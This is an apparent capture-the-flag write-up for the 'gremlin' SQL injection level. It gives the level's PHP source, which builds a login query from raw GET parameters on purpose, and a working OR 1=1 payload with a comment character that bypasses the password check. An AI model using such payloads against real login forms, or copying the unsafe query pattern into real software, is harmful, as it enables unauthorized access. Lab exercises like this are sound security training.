# Lvl Gremlin

### Vulnerability

Basic SQL injection in login form that checks both username and password .

### **Way to do it**

Bypass authentication by eliminating password parameter and using OR condition .

### **Restrictions**

- Filters: `prob`, `_`, `.`, `()`
- Checks both id and pw parameters

### **Bypass Methods**

```
?id='' OR 1=1%23--' and pw=''
```

### **Important Notes**

> "In this level it is checking both the username and the password to login... we can complete the level without the login and password using the above payload where I have eliminated the password parameter and gave an logical OR condition in the username to make it true."
> 

### **Level Code**

```
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
```